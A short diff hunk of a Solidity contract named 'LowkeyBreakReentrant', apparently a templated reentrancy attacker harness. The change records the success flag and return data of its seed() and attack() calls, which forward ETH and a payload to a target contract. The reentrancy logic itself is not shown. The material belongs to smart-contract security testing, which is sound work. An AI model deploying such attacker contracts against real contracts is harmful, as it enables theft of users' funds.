@@ -1238,11 +1238,15 @@ contract LowkeyBreakReentrant {{
 
     function seed(bytes calldata data) external payable {{
         (bool ok, bytes memory returndata) = target.call{{value: msg.value}}(data);
+        lastSeedSuccess = ok;
+        lastSeedReturndata = returndata;
         emit TargetCall("SEED", ok, returndata);
     }}
 
     function attack() external payable {{
         (bool ok, bytes memory returndata) = target.call{{value: msg.value}}(payload);
+        lastAttackSuccess = ok;
+        lastAttackReturndata = returndata;
         emit TargetCall("OUTER", ok, returndata);
     }}
 
